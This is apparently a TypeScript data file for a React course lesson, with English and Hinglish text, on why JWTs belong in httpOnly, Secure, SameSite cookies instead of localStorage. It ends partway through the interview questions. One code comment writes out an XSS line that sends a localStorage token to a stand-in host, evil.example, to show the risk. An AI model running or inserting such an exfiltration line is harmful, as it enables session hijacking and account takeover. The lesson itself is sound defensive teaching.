/**
 * React Complete Course — Module 6: Pro, lesson 10.
 *
 * Auth token storage: httpOnly cookies vs. localStorage. A hugely common
 * tutorial pattern — storing a JWT in localStorage after login, then
 * manually attaching it to every request via an Authorization header —
 * is convenient to write but means the token is fully readable by any
 * JavaScript running on the page, including a successful XSS payload
 * (this course's previous lesson) or a compromised third-party
 * dependency. Fixed by having the server set the token as an httpOnly
 * cookie instead, which JavaScript cannot read at all via document.cookie
 * or any other API, combined with Secure and SameSite attributes — the
 * browser then attaches it to requests automatically, and even a
 * successful XSS attack cannot exfiltrate a token it structurally cannot
 * read.
 *
 * NOTE for future editors: escape every inline-code backtick inside these
 * template literals, INCLUDING inside plain markdown paragraphs (the
 * `content`/`contentHi`/`simple`/`simpleHi` fields). Single-quoted string
 * fields (explain, why, q, a, task, keyTakeaways, etc.) do NOT need backticks
 * escaped — only escape apostrophes there as a SINGLE backslash (\'), never
 * doubled (\\'), which breaks the string. Run `npx tsc --noEmit -p .` after
 * writing this file, before wiring it into seed.ts — it is the only fully
 * reliable check for both mistakes.
 */

import type { CourseLesson } from './course-js-module1';

export const REACT_MODULE_6_PART10: CourseLesson[] = [
  {
    slug: 'auth-token-storage-httponly-cookies',
    title: 'Auth Token Storage: httpOnly Cookies vs. localStorage',
    titleHi: 'Auth Token Storage: httpOnly Cookies vs. localStorage',
    description: 'A login form works perfectly, storing the returned JWT in localStorage exactly like a hundred tutorials show — and the very next time an unrelated XSS bug slips into any part of the app, that token is instantly, trivially readable by whatever malicious script just started running.',
    descriptionHi: 'Ek login form poori tarah kaam karta hai, lautaaya gaya JWT ko \`localStorage\` mein bilkul sau tutorials ki tarah store karte hue — aur agli hi baar jab app ke kisi bhi hisse mein ek na-jude XSS bug ghus jaata hai, wo token turant, aasaani se us malicious script ke liye padhne-laayak hota hai jo abhi chalna shuru hui.',
    difficulty: 'HARD',
    duration: 20,
    order: 10,

    analogy: {
      en: '**A backstage concert pass printed with a plainly visible ID code on a lanyard hung around a person\'s neck, which anyone standing close enough can simply read and copy down — versus a wristband whose access chip can only ever be read by the venue\'s own door scanner, revealing nothing at all to anyone just looking at it, no matter how closely they look.** With the lanyard pass, the actual credential is sitting out in the open, printed in plain, readable characters — a bystander does not need to steal the physical pass at all; they only need to glance at it, or take a quick photo, to walk away with everything needed to fabricate their own working copy and gain the exact same backstage access as the original holder, for as long as that code remains valid. The wristband works completely differently: its chip communicates only with the venue\'s own door scanner through a channel no bystander has any way to intercept or read, so even someone standing directly next to the wearer, staring intently at the wristband, learns nothing usable from it at all — there is no readable code to copy down, because the wristband was never designed to expose one to begin with. Storing an auth token in localStorage is the lanyard pass: the token sits in a place any JavaScript running on the page, including a malicious script that should never have been there, can simply read in one line of code and send anywhere it wants. Storing it in an httpOnly cookie is the wristband: the browser and the server exchange it through a channel JavaScript is deliberately never given access to at all, so even a malicious script running successfully on the exact same page learns nothing usable from it, no matter how hard it tries to look.',
      hi: '**Ek backstage concert pass jismein ek saaf dikhta ID code ek lanyard par chhapa hai jo ek vyakti ki gardan mein latka hai, jise koi bhi paas khada koi bhi bas padh aur likh sakta hai — versus ek wristband jiska access chip sirf venue ke apne door scanner se hi kabhi padha jaa sakta hai, kisi ko bhi kuch bhi zaahir nahi karta jo bas ise dekhta hai, chahe wo kitni bhi gehraai se dekhein.** Lanyard pass ke saath, asli credential khule mein baitha hai, saaf, padhne-laayak characters mein chhapa hua — ek bystander ko physical pass chura ne ki bilkul zaroorat nahi hai; unhe bas ek nazar daalni hai, ya ek jaldi photo lena hai, apni khud ki kaam karti copy banaane ke liye zaroori sab kuch le kar jaane ke liye aur asli dhaarak jaisa bilkul wahi backstage access paane ke liye, jab tak wo code vaidh rehta hai. Wristband poori tarah alag tarike se kaam karta hai: iska chip sirf venue ke apne door scanner se ek channel ke zariye baat karta hai jise koi bhi bystander intercept ya padh nahi sakta, isliye koi bhi jo pehne wale ke bilkul bagal khada ho, wristband ko dhyaan se ghoorta ho, isse kuch bhi kaam ka nahi seekhta — koi padhne-laayak code hai hi nahi jo copy kiya jaaye, kyunki wristband ko shuru se hi ek expose karne ke liye kabhi design nahi kiya gaya. \`localStorage\` mein ek auth token store karna lanyard pass hai: token ek aisi jagah baitha hai jise page par chalti koi bhi JavaScript, ek malicious script sameet jise wahaan kabhi hona hi nahi chahiye tha, bas code ki ek line mein padh sakti hai aur jahan chaahe wahaan bhej sakti hai. Ise ek httpOnly cookie mein store karna wristband hai: browser aur server ise ek aise channel ke through exchange karte hain jise JavaScript ko jaan-boojhkar kabhi access diya hi nahi jaata, isliye ek malicious script bhi jo bilkul usi page par safalta se chal rahi ho isse kuch kaam ka nahi seekhti, chahe ye kitni bhi koshish kare dekhne ki.',
    },

    simple: `**Start broken.** A JWT stored in localStorage after login, manually attached to every request:

\`\`\`jsx
async function login(email, password) {
  const response = await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
  });
  const data = await response.json();
  localStorage.setItem("token", data.token);
}

async function fetchProfile() {
  const token = localStorage.getItem("token");
  return fetch("/api/profile", {
    headers: { Authorization: \`Bearer \${token}\` },
  });
}
\`\`\`

This is a hugely common pattern, and it works correctly — the login succeeds, the token is stored, and every subsequent request correctly authenticates by attaching it. The problem is not that this code is broken; it runs exactly as intended. The problem is WHERE the token ends up: \`localStorage\` is a plain JavaScript API, and anything with the ability to run JavaScript on this page can read it with the exact same one-line call, \`localStorage.getItem("token")\`. This course\'s previous lesson covered exactly how a script that was never supposed to be there can end up running on a real page anyway — an XSS payload smuggled in through unsanitized user content — and the instant any such script executes, reading the token and sending it to an attacker-controlled server is trivial, handing over a fully valid, working session with no password, no second factor, and often no easy way for the real user to even notice it happened.

**The fix: let the server set the token as an httpOnly cookie instead**

\`\`\`jsx
async function login(email, password) {
  await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
    credentials: "include", // send and receive cookies
  });
  // no token to store — the server already set it as a cookie
}

async function fetchProfile() {
  return fetch("/api/profile", {
    credentials: "include", // the browser attaches the cookie automatically
  });
}
\`\`\`

\`\`\`
// Server response to /api/login includes this header:
Set-Cookie: session=eyJhbGc...; HttpOnly; Secure; SameSite=Strict
\`\`\`

The server, not the frontend, decides where the token lives: instead of returning it in the response body for the frontend to store, it sets it directly as a cookie via a \`Set-Cookie\` response header, marked \`HttpOnly\`. The \`HttpOnly\` attribute is a browser-enforced rule that makes this specific cookie completely invisible to JavaScript — \`document.cookie\` will never include it, no matter what code runs on the page, including a fully successful XSS payload. The frontend code changes correspondingly: there is nothing to call \`localStorage.setItem\` on anymore, and every subsequent request simply includes \`credentials: "include"\`, letting the browser itself automatically attach the cookie the same way it always has for ordinary cookies — the frontend never touches the token\'s actual value at any point in this entire flow.`,

    simpleHi: `**Toote hue se shuru.** Login ke baad \`localStorage\` mein store hua ek JWT, jo manually har request se joda jaata hai:

\`\`\`jsx
async function login(email, password) {
  const response = await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
  });
  const data = await response.json();
  localStorage.setItem("token", data.token);
}

async function fetchProfile() {
  const token = localStorage.getItem("token");
  return fetch("/api/profile", {
    headers: { Authorization: \`Bearer \${token}\` },
  });
}
\`\`\`

Ye ek bahut aam pattern hai, aur ye sahi tarike se kaam karta hai — login safal hota hai, token store hota hai, aur har agli request ise jodkar sahi tarike se authenticate karti hai. Samasya ye nahi hai ki ye code toota hua hai; ye bilkul iraade ke hisaab se chalta hai. Samasya ye hai ki token AAKHIRKAAR KAHAAN JAATA HAI: \`localStorage\` ek saadha JavaScript API hai, aur is page par JavaScript chalaane ki kshamta rakhti koi bhi cheez ise bilkul usi ek-line call se padh sakti hai, \`localStorage.getItem("token")\`. Is course ka pehle wala lesson bilkul ye cover karta hai ki ek script jise kabhi wahaan hona hi nahi chahiye tha kaise phir bhi ek asli page par chal sakti hai — ek XSS payload jo na-sanitize-hui user content ke zariye ghusaaya gaya — aur jis pal koi bhi aisi script execute hoti hai, token padhna aur ise ek attacker-niyantrit server ko bhejna mamuli hai, ek poori tarah vaidh, kaam karta session sonpte hue koi password nahi, koi second factor nahi, aur aksar asli user ke liye ye jaanne ka koi aasaan tarika bhi nahi ki ye hua.

**Fix: server ko iske bajaye token ko ek httpOnly cookie ki tarah set karne do**

\`\`\`jsx
async function login(email, password) {
  await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
    credentials: "include", // cookies bhejo aur paao
  });
  // koi token store karne ke liye nahi — server ne pehle se ise ek cookie ki tarah set kar diya
}

async function fetchProfile() {
  return fetch("/api/profile", {
    credentials: "include", // browser cookie ko automatically jodta hai
  });
}
\`\`\`

\`\`\`
// /api/login ka server response is header ko shaamil karta hai:
Set-Cookie: session=eyJhbGc...; HttpOnly; Secure; SameSite=Strict
\`\`\`

Server, frontend nahi, faisla karta hai ki token kahaan rehta hai: ise response body mein lautaane ke bajaye jise frontend store kare, ye ise seedhe ek cookie ki tarah set karta hai ek \`Set-Cookie\` response header ke zariye, \`HttpOnly\` maark kiya hua. \`HttpOnly\` attribute ek browser-lagu-ki-gayi rule hai jo is khaas cookie ko JavaScript ke liye poori tarah na-dikhta banaata hai — \`document.cookie\` ise kabhi shaamil nahi karega, page par kuch bhi code chale, ek poori tarah safal XSS payload sameet. Frontend code us hisaab se badalta hai: ab \`localStorage.setItem\` ko bulaane ke liye kuch bacha hi nahi hai, aur har agli request bas \`credentials: "include"\` shaamil karti hai, browser ko khud us cookie ko automatically jodne dete hue bilkul jaise ye hamesha aam cookies ke liye karta hai — frontend is poori flow mein kisi bhi point par token ki asli value ko kabhi chhuta hi nahi.`,

    content: `## Why HttpOnly is a browser-enforced boundary, not a convention

\`\`\`js
// In the browser's console, on a page that received an HttpOnly cookie:
document.cookie
// "" — the HttpOnly cookie is simply absent from this list entirely,
// not merely hidden or masked
\`\`\`

\`HttpOnly\` is not a hint or a naming convention that well-behaved code happens to respect — it is a rule the browser itself enforces at the platform level, completely independent of what JavaScript on the page tries to do. \`document.cookie\`, the only API JavaScript has for reading cookies at all, simply never includes any cookie marked \`HttpOnly\` in its output, regardless of how that JavaScript came to be running or what it is trying to accomplish. This is precisely why it protects against XSS specifically: an XSS payload succeeding means an attacker\'s JavaScript is now running with exactly the same privileges as the page\'s own legitimate code, but that shared privilege level still does not include reading an \`HttpOnly\` cookie, since the restriction is enforced beneath the JavaScript layer entirely, in the browser itself.

## Secure and SameSite: the other two attributes that matter

\`\`\`
Set-Cookie: session=eyJhbGc...; HttpOnly; Secure; SameSite=Strict
                                          ^^^^^^  ^^^^^^^^^^^^^^^^
\`\`\`

\`Secure\` tells the browser to only ever send this cookie over an HTTPS connection, never plain unencrypted HTTP — without it, the same cookie could be transmitted over an insecure network connection and be readable to anyone able to intercept that traffic, an entirely different risk from XSS but one worth closing at the same time. \`SameSite\` controls whether this cookie gets attached to requests originating from a different site than the one that set it, which is the primary defense against CSRF (covered in this course\'s next lesson) — \`Strict\` is the most restrictive setting, and \`Lax\` is a common, slightly more permissive middle ground many real applications use instead.

## The tradeoff: the frontend can no longer read "is the user logged in" from the token itself

\`\`\`jsx
// Since the cookie is HttpOnly, the frontend cannot inspect it directly.
// Instead, it asks the server:
async function checkAuthStatus() {
  const response = await fetch("/api/me", { credentials: "include" });
  return response.ok; // the browser sent the HttpOnly cookie automatically;
                       // the server's response tells the frontend whether it was valid
}
\`\`\`

Storing the token in \`localStorage\` had one genuine, if minor, convenience this approach gives up: the frontend could read the token directly and decode its payload (a JWT\'s payload, though not verifiable client-side, is at least readable) to check things like an expiration time without making a network request. With an \`HttpOnly\` cookie, the frontend has no way to inspect the token\'s contents at all — determining whether a user is currently authenticated, or reading any claim encoded in the token, requires asking the server directly, typically via a small endpoint like \`/api/me\` that responds based on whatever cookie the browser automatically attached. This is a deliberate, worthwhile tradeoff: the small inconvenience of one additional network request is a reasonable price for the token itself being genuinely unreadable to any script running on the page.

## This is defense-in-depth, not a replacement for sanitizing input

\`\`\`
Layer 1: sanitize user content (this course's previous XSS lesson) —
         prevents a malicious script from running on the page at all.

Layer 2: HttpOnly cookies — even if layer 1 fails and a script does run,
         it still cannot read the token.
\`\`\`

Storing the auth token in an \`HttpOnly\` cookie does not make sanitizing user content unnecessary — a successful XSS payload can still do real damage even without ever touching the auth token: it can make requests on the user\'s behalf using whatever cookies the browser automatically attaches (which is precisely the CSRF concern the next lesson addresses), read and exfiltrate whatever else is genuinely visible to JavaScript (other \`localStorage\` values, the page\'s own rendered content, anything the user types afterward), or simply deface or manipulate what the user sees. \`HttpOnly\` cookies close one specific, serious consequence of a successful XSS attack — the wholesale theft of a fully working session token — but they are one layer in a defense-in-depth strategy, not a substitute for the sanitization work that prevents the attack from succeeding in the first place.`,

    contentHi: `## \`HttpOnly\` ek browser-lagu-ki-gayi boundary kyun hai, ek convention nahi

\`\`\`js
// Browser ke console mein, ek page par jise ek HttpOnly cookie mili:
document.cookie
// "" — HttpOnly cookie bas is list se poori tarah gayab hai,
// sirf chhupi ya masked nahi
\`\`\`

\`HttpOnly\` koi sanket ya naming convention nahi hai jise achhe-vyavhaar wala code samyog se maanta hai — ye ek rule hai jise browser khud platform star par lagu karta hai, page par JavaScript kya karne ki koshish karti hai us se poori tarah swatantra. \`document.cookie\`, ekmatra API jo JavaScript ke paas bilkul cookies padhne ke liye hai, bas kabhi koi bhi \`HttpOnly\` maark ki gayi cookie apne output mein shaamil nahi karta, chahe wo JavaScript kaise chalne aayi ho ya kya haasil karne ki koshish kar rahi ho. Bilkul isi wajah se ye khaas taur par XSS ke khilaaf surakshit karta hai: ek XSS payload ka safal hona matlab hai attacker ki JavaScript ab bilkul wahi privileges ke saath chal rahi hai jo page ke apne vaidh code ki hain, par wo shared privilege level phir bhi ek \`HttpOnly\` cookie padhna shaamil nahi karta, kyunki restriction JavaScript layer ke poori tarah neeche, khud browser mein, lagu ki jaati hai.

## \`Secure\` aur \`SameSite\`: doosre do attributes jo maayne rakhte hain

\`\`\`
Set-Cookie: session=eyJhbGc...; HttpOnly; Secure; SameSite=Strict
                                          ^^^^^^  ^^^^^^^^^^^^^^^^
\`\`\`

\`Secure\` browser ko batata hai ki ye cookie sirf hamesha ek HTTPS connection ke through bheji jaaye, kabhi saadha na-encrypted HTTP nahi — iske bina, wahi cookie ek asurakshit network connection ke through transmit ho sakti hai aur kisi ke liye padhne-laayak ho sakti hai jo us traffic ko intercept kar sake, XSS se ek poori tarah alag khatra par ek jise ek saath band karna zaruri hai. \`SameSite\` niyantrit karta hai ki kya ye cookie ek alag site se aati requests se jodi jaati hai us site se jisne ise set kiya, jo CSRF (is course ka agla lesson) ke khilaaf mukhya defense hai — \`Strict\` sabse sakht setting hai, aur \`Lax\` ek aam, thoda zyaada permissive beech ka raasta hai jise kai asli applications iske bajaye istemal karte hain.

## Tradeoff: frontend ab token se khud "kya user logged in hai" nahi padh sakta

\`\`\`jsx
// Kyunki cookie HttpOnly hai, frontend ise seedhe inspect nahi kar sakta.
// Iske bajaye, ye server se poochta hai:
async function checkAuthStatus() {
  const response = await fetch("/api/me", { credentials: "include" });
  return response.ok; // browser ne HttpOnly cookie automatically bheji;
                       // server ka response frontend ko batata hai ki ye vaidh thi ya nahi
}
\`\`\`

Token ko \`localStorage\` mein store karna ek asli, chahe chhoti, suvidha deta tha jise ye tarika chhod deta hai: frontend seedhe token padh sakta tha aur uska payload decode kar sakta tha (ek JWT ka payload, chahe client-side verify-na-hone-laayak, kam-se-kam padhne-laayak to hai) ek network request kiye bina expiration time jaisi cheezein check karne ke liye. Ek \`HttpOnly\` cookie ke saath, frontend ke paas token ki contents ko bilkul inspect karne ka koi tarika nahi hai — kya ek user abhi authenticated hai ye tay karna, ya token mein encode koi claim padhna, server se seedhe poochna maangta hai, aam taur par \`/api/me\` jaisi ek chhoti endpoint ke zariye jo jawaab deti hai jo bhi cookie browser ne automatically jodi uske aadhaar par. Ye ek jaan-boojhkar, keemti tradeoff hai: ek additional network request ki chhoti asuvidha page par chalti kisi bhi script ke liye token khud sach mein na-padhne-laayak hone ke liye ek samajhdaar keemat hai.

## Ye defense-in-depth hai, user content sanitize karne ka replacement nahi

\`\`\`
Layer 1: user content sanitize karo (is course ka pehle wala XSS
         lesson) — ek malicious script ko page par bilkul chalne se rokta hai.

Layer 2: HttpOnly cookies — chahe layer 1 fail ho jaaye aur ek script
         chal jaaye, ye phir bhi token nahi padh sakti.
\`\`\`

Auth token ko ek \`HttpOnly\` cookie mein store karna user content sanitize karna bekaar nahi banaata — ek safal XSS payload phir bhi asli nuksaan pahuncha sakta hai auth token ko chhue bina bhi: ye user ki taraf se requests bana sakta hai jo bhi cookies browser automatically jodta hai unka istemal karke (jo bilkul agla lesson jo CSRF chinta sambodhit karta hai), jo bhi doosra JavaScript ke liye sach mein dikhta hai use padh aur exfiltrate kar sakta hai (doosri \`localStorage\` values, page ki apni rendered content, jo kuch bhi user baad mein type kare), ya bas user jo dekhta hai use badal ya kharaab kar sakta hai. \`HttpOnly\` cookies ek khaas, gambhir natija band karti hain ek safal XSS attack ka — ek poori tarah kaam karte session token ki poori chori — par wo ek defense-in-depth strategy ki ek layer hain, us sanitization kaam ka replacement nahi jo attack ko pehli jagah safal hone se rokta hai.`,

    examples: [
      {
        title: 'Broken: JWT stored in localStorage, readable by any script',
        titleHi: 'Toota: \`localStorage\` mein store hua JWT, kisi bhi script ke liye padhne-laayak',
        code: `localStorage.setItem("token", data.token);
// any script running on the page, including an XSS payload, can read this:
localStorage.getItem("token")`,
        codeJs: `async function login(email, password) {
  const response = await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
  });
  const data = await response.json();
  localStorage.setItem("token", data.token);
}

async function fetchProfile() {
  const token = localStorage.getItem("token");
  return fetch("/api/profile", {
    headers: { Authorization: \`Bearer \${token}\` },
  });
}
// a successful XSS payload can run: fetch("https://evil.example?t=" + localStorage.getItem("token"))`,
        codeTs: `interface LoginResponse {
  token: string;
}

async function login(email: string, password: string): Promise<void> {
  const response = await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
  });
  const data: LoginResponse = await response.json();
  localStorage.setItem("token", data.token);
}

async function fetchProfile(): Promise<Response> {
  const token = localStorage.getItem("token");
  return fetch("/api/profile", {
    headers: { Authorization: \`Bearer \${token}\` },
  });
}
// TypeScript does not catch this — localStorage.setItem's signature is
// satisfied correctly. This is a security practice issue, entirely
// outside what a type checker can catch.`,
        output: `Login and every subsequent authenticated request work correctly.
If any XSS vulnerability exists anywhere in the app, the token is
one line of code away from being read and sent to an attacker.`,
        explain: 'localStorage has no concept of restricting which script can read it — any JavaScript executing on the page, legitimate or injected, has equal access.',
        explainHi: '\`localStorage\` ke paas ye seemit karne ki koi dhaarna nahi hai ki kaunsi script ise padh sakti hai — page par chalti koi bhi JavaScript, vaidh ya injected, ke paas samaan access hai.',
      },
      {
        title: 'Fixed: server sets the token as an HttpOnly cookie',
        titleHi: 'Theek: server token ko ek \`HttpOnly\` cookie ki tarah set karta hai',
        code: `// Server response header:
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
// Frontend never touches the token's value at all`,
        codeJs: `async function login(email, password) {
  await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
    credentials: "include",
  });
  // nothing to store — the server already set the cookie
}

async function fetchProfile() {
  return fetch("/api/profile", {
    credentials: "include",
  });
}`,
        codeTs: `async function login(email: string, password: string): Promise<void> {
  await fetch("/api/login", {
    method: "POST",
    body: JSON.stringify({ email, password }),
    credentials: "include",
  });
}

async function fetchProfile(): Promise<Response> {
  return fetch("/api/profile", {
    credentials: "include",
  });
}`,
        outputJs: `document.cookie in the browser console never includes the session
cookie at all. Even a successful XSS payload running on this exact
page cannot read or exfiltrate the token, since no JavaScript API
exposes it.`,
        outputTs: `// Identical behaviour. The frontend's own TypeScript code has no
// variable holding the token's value anywhere — there is nothing
// for a type or a script to read in the first place.`,
        explain: 'The frontend code no longer touches the token\'s value at any point — it is set, stored, and automatically attached entirely by the browser and server, outside JavaScript\'s reach.',
        explainHi: 'Frontend code ab kisi bhi point par token ki value ko chhuta hi nahi — ye set hota hai, store hota hai, aur automatically joda jaata hai poori tarah browser aur server dwara, JavaScript ki pahunch se baahar.',
      },
      {
        title: 'Checking auth status without ever reading the token directly',
        titleHi: 'Token seedhe padhe bina auth status check karna',
        code: `const response = await fetch("/api/me", { credentials: "include" });
const isLoggedIn = response.ok;`,
        codeJs: `function useAuthStatus() {
  const [isLoggedIn, setIsLoggedIn] = useState(null);

  useEffect(() => {
    fetch("/api/me", { credentials: "include" })
      .then((response) => setIsLoggedIn(response.ok))
      .catch(() => setIsLoggedIn(false));
  }, []);

  return isLoggedIn;
}`,
        codeTs: `function useAuthStatus(): boolean | null {
  const [isLoggedIn, setIsLoggedIn] = useState<boolean | null>(null);

  useEffect(() => {
    fetch("/api/me", { credentials: "include" })
      .then((response) => setIsLoggedIn(response.ok))
      .catch(() => setIsLoggedIn(false));
  }, []);

  return isLoggedIn;
}`,
        outputJs: `The hook correctly reports whether the user is authenticated,
relying on the browser automatically attaching the HttpOnly cookie
to this request — the frontend never sees or handles the token's
actual value at any point.`,
        outputTs: `// Identical behaviour. The "boolean | null" return type correctly
// models the three real states: not yet checked (null), logged in
// (true), and not logged in (false).`,
        explain: 'Determining auth status now requires one small network request instead of a synchronous local read, a deliberate tradeoff for the token being genuinely unreadable to any script.',
        explainHi: 'Auth status tay karna ab ek chhoti network request maangta hai ek synchronous local read ke bajaye, ek jaan-boojhkar tradeoff us fayde ke liye ki token kisi bhi script ke liye sach mein na-padhne-laayak hai.',
      },
    ],

    mistakes: [
      {
        wrong: `localStorage.setItem("token", data.token);
// readable by any JavaScript running on the page, including an XSS payload`,
        right: `// Server sets: Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
// Frontend just uses credentials: "include" — never touches the token's value`,
        why: 'A token stored in localStorage is readable by any script executing on the page, turning a single successful XSS vulnerability anywhere in the app into a full session compromise.',
        whyHi: '\`localStorage\` mein store hua ek token page par chalti kisi bhi script ke liye padhne-laayak hai, app mein kahin bhi ek akeli safal XSS vulnerability ko ek poore session compromise mein badalte hue.',
      },
      {
        wrong: `Set-Cookie: session=eyJhbGc...
// no HttpOnly, no Secure, no SameSite — JavaScript can read it, it can
// be sent over plain HTTP, and it's attached to cross-site requests`,
        right: `Set-Cookie: session=eyJhbGc...; HttpOnly; Secure; SameSite=Strict
// all three attributes present, each closing a distinct risk`,
        why: 'Setting a cookie without HttpOnly, Secure, and SameSite leaves it exposed to JavaScript, insecure transport, and cross-site requests respectively — each attribute closes a specific, different risk.',
        whyHi: 'Ek cookie ko \`HttpOnly\`, \`Secure\`, aur \`SameSite\` bina set karna ise JavaScript, asurakshit transport, aur cross-site requests ke liye ujaagar chhod deta hai — har attribute ek khaas, alag khatra band karta hai.',
      },
      {
        wrong: `// Trying to read the HttpOnly cookie's value directly to check login state
const token = document.cookie.split("session=")[1]; // always undefined/empty`,
        right: `const response = await fetch("/api/me", { credentials: "include" });
const isLoggedIn = response.ok; // ask the server, since the cookie's value is invisible to JS`,
        why: 'Attempting to read an HttpOnly cookie\'s value through document.cookie will never work by design — auth status must be checked by asking the server, not by inspecting the cookie client-side.',
        whyHi: 'Ek \`HttpOnly\` cookie ki value ko \`document.cookie\` ke through padhne ki koshish design se kabhi kaam nahi karegi — auth status server se poochkar check kiya jaana chahiye, cookie ko client-side inspect karke nahi.',
      },
    ],

    realWorld: [
      {
        en: '**Storing JWTs in localStorage specifically because of its vulnerability to XSS is a widely documented, commonly cited security anti-pattern**, discussed extensively across security-focused engineering blogs and OWASP\'s own guidance on session management.',
        hi: '**Khaas taur par XSS ke prati iski vulnerability ki wajah se JWTs ko \`localStorage\` mein store karna ek vyaapak roop se documented, aam taur par cite kiya jaane waala security anti-pattern hai**, security-kendrit engineering blogs aur OWASP ki apni session management guidance mein vistrit roop se charcha ki jaati hai.',
      },
      {
        en: '**HttpOnly, Secure, and SameSite are all standard, officially specified cookie attributes supported by every major browser**, not a React-specific or framework-specific technique — the same protection applies regardless of which frontend framework a cookie-authenticated application uses.',
        hi: '**\`HttpOnly\`, \`Secure\`, aur \`SameSite\` sab standard, officially specified cookie attributes hain jo har mukhya browser support karta hai**, koi React-khaas ya framework-khaas technique nahi — wahi protection lagu hoti hai chahe ek cookie-authenticated application koi bhi frontend framework istemal kare.',
      },
      {
        en: '**Real, publicly documented incidents involving stolen session tokens have repeatedly traced back to a token stored somewhere JavaScript could read it, combined with an unrelated XSS bug elsewhere in the same application** — the two vulnerabilities compound each other rather than existing independently.',
        hi: '**Chori hue session tokens shaamil karti asli, saarvajanik roop se documented incidents baar-baar ek aisi jagah store hue token tak track ki gayi hain jise JavaScript padh sakti thi, usi application mein kahin ek na-jude XSS bug ke saath milkar** — do vulnerabilities ek doosre ko badhaati hain swatantra roop se maujood rehne ke bajaye.',
      },
    ],

    interviewQA: [
      {
        q: 'Why does storing an auth token in localStorage turn any XSS vulnerability, even an unrelated one elsewhere in the app, into a full session compromise?',
        qHi: 'Ek auth token ko \`localStorage\` mein store karna kisi bhi XSS vulnerability ko, chahe app mein kahin aur ek na-jude wali bhi ho, ek poore session compromise mein kyun badal deta hai?',
        a: 'localStorage is a plain, unrestricted JavaScript API — any script currently executing in the context of that page, regardless of where that script actually came from or who wrote it, has exactly the same ability to call localStorage.getItem as the application\'s own legitimate code does. This is precisely what an XSS vulnerability grants an attacker: the ability to get their own JavaScript running in that same page context, with all the same privileges the page\'s own code has, including full read access to anything stored in localStorage. Critically, the XSS vulnerability that grants this access does not need to have anything at all to do with the authentication system itself — it could be a completely unrelated feature, such as a comment section rendering unsanitized HTML, a search results page reflecting a query parameter without escaping it, or any other injection point anywhere in the application. Once an attacker\'s script is running, regardless of which feature let it in, it can immediately read localStorage.getItem("token") and send that value to a server the attacker controls, and from that point on, the attacker possesses a fully valid, working credential indistinguishable from the real user\'s own token, usable for as long as that token remains valid, entirely independent of the specific bug that let the attacker\'s script run in the first place. This is why an auth token stored in localStorage effectively means the security of the ENTIRE application\'s authentication depends on every single feature, everywhere, being completely free of any XSS vulnerability — a single missed sanitization step anywhere becomes a full account takeover.',
        aHi: '\`localStorage\` ek saadha, na-seemit JavaScript API hai — koi bhi script jo abhi us page ke context mein chal rahi hai, wo script asal mein kahaan se aayi ya kisne likhi us se bekhabar, ke paas bilkul wahi kshamta hai \`localStorage.getItem\` bulaane ki jo application ke apne vaidh code ke paas hai. Ye bilkul wahi hai jo ek XSS vulnerability ek attacker ko deti hai: apni khud ki JavaScript ko usi page context mein chalaane ki kshamta, page ke apne code ke paas jo bhi samaan privileges hain unke saath, \`localStorage\` mein store kisi bhi cheez tak poori read access sameet. Bahut zaruri, XSS vulnerability jo ye access deti hai use authentication system se khud kuch bhi lena-dena hone ki zaroorat nahi hai — ye ek poori tarah na-judi feature ho sakti hai, jaise ek comment section jo na-sanitize-hui HTML render karta hai, ek search results page jo ek query parameter ko bina escape kiye reflect karta hai, ya application mein kahin bhi koi doosra injection point. Ek baar attacker ki script chal rahi hai, chahe kaunsi feature ne ise andar aane diya, ye turant \`localStorage.getItem("token")\` padh sakti hai aur wo value ek server ko bhej sakti hai jise attacker niyantrit karta hai, aur us point se aage, attacker ke paas ek poori tarah vaidh, kaam karta credential hai asli user ke apne token se alag-nahi-pehchaani-jaane-laayak, jab tak wo token vaidh rehta hai istemal-laayak, us khaas bug se poori tarah swatantra jisne attacker ki script ko pehli jagah chalne diya. Bilkul isi wajah se \`localStorage\` mein store hua ek auth token asar mein matlab hai ki POORI application ki authentication ki suraksha is baat par nirbhar hai ki har akeli feature, har jagah, kisi bhi XSS vulnerability se poori tarah mukt ho — kahin bhi ek chhoota hua sanitization step ek poora account takeover ban jaata hai.',
      },
      {
        q: 'Why does HttpOnly protect against XSS reading the cookie specifically, and what does it NOT protect against?',
        qHi: '\`HttpOnly\` khaas taur par XSS ke cookie padhne ke khilaaf kyun surakshit karta hai, aur ye kis cheez ke khilaaf SURAKSHIT NAHI karta?',
        a: 'HttpOnly is a browser-enforced restriction on the cookie itself, applied at a level entirely beneath JavaScript: when a cookie carries this attribute, the browser simply never includes it in whatever document.cookie returns, and no other JavaScript-accessible API exposes it either, regardless of the privileges the requesting script happens to have. This means an XSS payload, even one running with the exact same effective privileges as the page\'s own legitimate code, has no API available to it that would ever return this specific cookie\'s value — there is nothing to read, not because the script lacks permission in some checkable sense, but because the browser itself never surfaces the value to any JavaScript context at all. What HttpOnly does NOT protect against is a categorically different consequence of the same underlying XSS vulnerability: even with the cookie itself completely unreadable, a malicious script can still make HTTP requests from the victim\'s browser, and the browser will still automatically attach that same HttpOnly cookie to any request the script initiates to the relevant domain, exactly as it would for a request the legitimate page code initiated. This means an attacker\'s script cannot steal the token to reuse later from somewhere else, but it can still cause the victim\'s own browser to make authenticated requests on the attacker\'s behalf right now, while the malicious script is running — actions like changing an email address, transferring funds, or posting content, all performed with the cookie the browser sends along automatically, without the attacker\'s script ever needing to know or read the cookie\'s actual value. This second consequence is a cross-site request forgery concern, addressed by SameSite and other CSRF-specific defenses, not by HttpOnly.',
